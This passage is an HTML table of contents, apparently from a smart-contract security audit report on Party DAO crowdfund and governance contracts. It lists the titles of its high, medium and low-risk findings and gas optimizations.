href=\"#h-07-initialethcrowdfund--reraiseethcrowdfund-batchcontributefor-function-may-not-refund-eth-which-leads-to-loss-of-funds\">[H-07] <code>InitialETHCrowdfund</code> + <code>ReraiseETHCrowdfund</code>: <code>batchContributeFor</code> function may not refund ETH which leads to loss of funds</a></li>\n<li><a href=\"#h-08-vetoproposal-user-can-veto-multiple-times-so-every-proposal-can-be-vetoed-by-any-user-that-has-a-small-amount-of-votes\">[H-08] <code>VetoProposal</code>: User can veto multiple times so every proposal can be vetoed by any user that has a small amount of votes</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#medium-risk-findings-12\">Medium Risk Findings (12)</a></p>\n<ul>\n<li><a href=\"#m-01-use-of-_mint-in-reraiseethcrowdfund_contribute-is-incompatible-with-partygovernancenftmint\">[M-01] Use of <code>_mint</code> in <code>ReraiseETHCrowdfund#_contribute</code> is incompatible with <code>PartyGovernanceNFT#mint</code></a></li>\n<li><a href=\"#m-02-maxcontribution-check-can-be-bypassed-to-give-a-card-high-voting-power\">[M-02] <code>MaxContribution</code> check can be bypassed to give a card high voting power</a></li>\n<li><a href=\"#m-03-contributions-can-be-smaller-than-mincontribution-and-may-receive-no-voting-power\">[M-03] Contributions can be smaller than <code>minContribution</code> and may receive no voting power</a></li>\n<li><a href=\"#m-04-reraiseethcrowdfundclaimmultiple-can-be-used-to-grief-large-depositors\">[M-04] <code>ReraiseETHCrowdfund#claimMultiple</code> can be used to grief large depositors</a></li>\n<li><a href=\"#m-05-possible-dos-attack-using-dust-in-reraiseethcrowdfund_contribute\">[M-05] Possible DOS attack using dust in <code>ReraiseETHCrowdfund._contribute()</code></a></li>\n<li><a href=\"#m-06-partygovernancenftsol-burn-function-does-not-reduce-totalvotingpower-making-it-impossible-to-reach-unanimous-votes\">[M-06] <code>PartyGovernanceNFT.sol</code>: burn function does not reduce <code>totalVotingPower</code> making it impossible to reach unanimous votes</a></li>\n<li><a href=\"#m-07-totalvotingpower-needs-to-be-snapshotted-for-each-proposal-because-it-can-change-and-thereby-affect-consensus-when-accepting--vetoing-proposals\">[M-07] <code>totalVotingPower</code> needs to be snapshotted for each proposal because it can change and thereby affect consensus when accepting / vetoing proposals</a></li>\n<li><a href=\"#m-08-ethcrowdfundbasesol-all-funds-are-lost-when-fee-recipient-cannot-receive-eth\">[M-08] <code>ETHCrowdfundBase.sol</code>: All funds are lost when fee recipient cannot receive ETH</a></li>\n<li><a href=\"#m-09-initialethcrowdfund--reraiseethcrowdfund-gatekeeper-checks-wrong-address\">[M-09] <code>InitialETHCrowdfund</code> + <code>ReraiseETHCrowdfund</code>: Gatekeeper checks wrong address</a></li>\n<li><a href=\"#m-10-operatorproposalsol-leftover-eth-is-not-refunded-to-the-msgsender\">[M-10] <code>OperatorProposal.sol</code>: Leftover ETH is not refunded to the <code>msg.sender</code></a></li>\n<li><a href=\"#m-11-collectionbatchbuyoperatorsol-tokenids-array-is-not-shortened-properly-which-makes-execute-function-revert-when-not-all-nfts-are-purchased-successfully\">[M-11] <code>CollectionBatchBuyOperator.sol</code>: <code>tokenIds</code> array is not shortened properly which makes execute function revert when not all NFTs are purchased successfully</a></li>\n<li><a href=\"#m-12-vetoproposal-proposals-cannot-be-vetoed-in-all-states-in-which-it-should-be-possible-to-veto-proposals\">[M-12] <code>VetoProposal</code>: proposals cannot be vetoed in all states in which it should be possible to veto proposals</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#low-risk-and-non-critical-issues\">Low Risk and Non-Critical Issues</a></p>\n<ul>\n<li><a href=\"#summary-1\">Summary</a></li>\n<li><a href=\"#l-01-eth-is-not-refunded-when-allowarbcallstospendpatyethtrue\">L-01 ETH is not refunded when <code>allowArbCallsToSpendPatyETH=true</code></a></li>\n<li><a href=\"#l-02-comments-state-that-pre-existing-eth-can-be-used-but-it-cant\">L-02 Comments state that pre-existing ETH can be used but it can’t</a></li>\n<li><a href=\"#l-03-issue-due-to-rounding-from-previous-c4-audit-is-still-present-in-new-crowdfund-contracts\">L-03 Issue due to rounding from previous C4 audit is still present in new crowdfund contracts</a></li>\n<li><a href=\"#l-04-use-delegationsbycontributorcontributor-instead-of-delegate-when-minting-party-card\">L-04 Use <code>delegationsByContributor[contributor]</code> instead of <code>delegate</code> when minting party card</a></li>\n<li><a href=\"#l-05-attacker-can-decide-how-voting-power-is-distributed-across-party-cards-griefing-attack\">L-05 Attacker can decide how voting power is distributed across party cards (griefing attack)</a></li>\n<li><a href=\"#l-06-use-uint256-for-computations-such-that-voting-power-can-be-all-values-in-uint96-range\">L-06 Use <code>uint256</code> for computations such that voting power can be all values in <code>uint96</code> range</a></li>\n<li><a href=\"#l-07-allow-specifying-maximumprice-for-individual-nfts\">L-07 Allow specifying <code>maximumPrice</code> for individual NFTs</a></li>\n<li><a href=\"#n-01-introduce-separate-vetothresholdbps-for-vetoing-a-proposal\">N-01 Introduce separate <code>vetoThresholdBps</code> for vetoing a proposal</a></li>\n<li><a href=\"#n-02-operationexecuted-event-is-defined-but-never-emitted\">N-02 <code>OperationExecuted</code> event is defined but never emitted</a></li>\n<li><a href=\"#n-03-use-transfereth-instead-of-transfer-for-transferring-eth\">N-03 Use <code>transferEth</code> instead of <code>transfer</code> for transferring ETH</a></li>\n<li><a href=\"#n-04-check-that-none-of-the-authorities-is-zero-address\">N-04 Check that none of the <code>authorities</code> is zero address</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#gas-optimizations\">Gas Optimizations</a></p>\n<ul>\n<li><a href=\"#g-01-use-maxtotalcontributations_-memory-variable-instead-of-maxtotalcontributions\">G-01 Use <code>maxTotalContributations_</code> memory variable instead of <code>maxTotalContributions</code></a></li>\n<li><a href=\"#g-02-no-need-to-cache-fundingsplitrecipient-in-memory-variable\">G-02 No need to cache <code>fundingSplitRecipient</code> in memory variable</a></li>\n<li><a href=\"#g-03-cache-party-in-memory-variable\">G-03 Cache <code>party</code> in memory variable</a></li>\n<li><a href=\"#g-04-save-votingpowerbycardi-in-memory-variable\">G-04 Save <code>votingPowerByCard[i]</code> in memory variable</a></li>\n<li><a href=\"#g-05-use-mintedvotingpower_-instead-of-mintedvotingpower\">G-05 Use <code>mintedVotingPower_</code> instead of <code>mintedVotingPower</code></a></li>\n</ul>\n</li>\n<li><a href=\"#disclosures\">Disclosures</a></li>\n</ul>"
}